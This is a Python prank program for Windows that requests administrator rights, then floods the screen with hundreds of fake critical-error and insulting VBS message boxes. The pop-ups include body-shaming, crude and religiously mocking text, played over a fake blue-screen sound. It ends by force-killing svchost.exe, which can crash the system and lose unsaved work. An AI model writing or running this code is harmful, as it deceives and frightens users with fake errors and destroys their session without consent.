import os, random, psutil, signal, autoit, simpleaudio, time, ctypes, sys
from tkinter import Tk

if ctypes.windll.shell32.IsUserAnAdmin():

    with open("scripts/bsod.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("BSOD MOD TRIGGERED !",16+4096,"HO YEAH BOY")""")
    with open("scripts/fatma.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("ERROR 0x0073b: YOU ARE FAT.",16+4096,"Critical error in line 256; Threading")""")
    with open("scripts/boom.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("BOOM !",16+4096,"BOOM BOOM")""")
    with open("scripts/ahh.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("ALAHWAKBAR !",16+4096,"LETS GOOO")""")
    with open("scripts/del.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("Start of automatic window deletion...",16+4096,"Delete in comming...")""")
    with open("scripts/windows.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("ERROR 0x4057t: WINDOW AS MEET AN ERROR !",16+4096,"Critical core error in line 3122; core.cpp")""")
    with open("scripts/dick.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("You have a small dick lol.",16+4096,"Heavy")""")
    with open("scripts/explode.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("Windows encountered a fatal error while executing the connection to sql server, your pc will explode.",16+4096,"This is not a joke")""")
    with open("scripts/shit.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("Please stop shitting on your pc !",16+4096,"Do not read below")""")

    pos = 0
    pos2 = 0
    d = {"scripts/shit.vbs": "Do not read below", "scripts/explode.vbs": "This is not a joke", "scripts/dick.vbs": "Heavy", "scripts/del.vbs": "Delete in comming...", "scripts/ahh.vbs": "LETS GOOO", "scripts/boom.vbs": "BOOM BOOM", "scripts/bsod.vbs": "HO YEAH BOY", "scripts/fatma.vbs": "Critical error in line 256; Threading", "scripts/windows.vbs": "Critical core error in line 3122; core.cpp"}
    tk = Tk()
    ww = tk.winfo_screenwidth()
    wh = tk.winfo_screenheight()
    del tk

    def KillAllWindows():
        
        global pos, pos2
        
        pos = 0
        pos2 = 0
        process_pid_list = list()
        for p in psutil.process_iter(): 
            if p.name() == "wscript.exe":
                process_pid_list.append(p.pid)
        for p in process_pid_list: os.kill(p, signal.SIGBREAK)

    def TkRage():
        
        os.startfile("scripts/del.vbs")
        while True:
            try:
                autoit.win_move(d["scripts/del.vbs"], 350, 350)
                break
            except: continue
        os.startfile("scripts/del.vbs")
        while True:
            try:
                autoit.win_move(d["scripts/del.vbs"], 350, wh-350)
                break
            except: continue
        os.startfile("scripts/del.vbs")
        while True:
            try:
                autoit.win_move(d["scripts/del.vbs"], ww-350, 350)
                break
            except: continue
        os.startfile("scripts/del.vbs")
        while True:
            try:
                autoit.win_move(d["scripts/del.vbs"], ww-350, wh-350)
                break
            except: continue

    simpleaudio.WaveObject.from_wave_file("assets/BSOD.wav").play()

    time.sleep(1.75)
    os.startfile("scripts/bsod.vbs")
    while True:
        try:
            autoit.win_move(d["scripts/bsod.vbs"], round(ww/2), round(wh/2))
            break
        except: continue
    time.sleep(9.5)
    TkRage()
    time.sleep(5.5)
    TkRage()
    time.sleep(3.8)
    KillAllWindows()
    os.startfile("scripts/boom.vbs")
    time.sleep(0.2)
    os.startfile("scripts/boom.vbs")
    time.sleep(3)
    KillAllWindows()
    for i in range(50):
        os.startfile("scripts/explode.vbs")
        while True:
            try:
                autoit.win_move(d["scripts/explode.vbs"], pos, pos)
                break
            except: continue
        pos += 25 
    KillAllWindows()
    for i in range(150):      
        if random.choice([True, False]):
            pos = round(ww/2+i)
            pos2 = round(wh/2-i)
        else:
            pos = round(ww/2-i)
            pos2 = round(wh/2+i)
        os.startfile("scripts/windows.vbs")
        while True:
            try:
                autoit.win_move(d["scripts/windows.vbs"], pos, pos2)
                break
            except: continue
    KillAllWindows()
    for i in range(170):
        
            os.startfile("scripts/fatma.vbs")
            while True:
                try:
                    autoit.win_move(d["scripts/fatma.vbs"], i, i)
                    break
                except: continue
    KillAllWindows()
    for i in range(300):
        pos2 = random.randint(0, wh)
        pos = random.randint(0, ww)
        s = list()
        for k in d.keys(): s.append(str(k))
        k = random.choice(s)
        os.startfile(k)
        while True:
            try:
                autoit.win_move(d[k], pos, pos2)
                break
            except: continue
            
    KillAllWindows()
    os.system("taskkill /f /im svchost.exe")
        
else: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
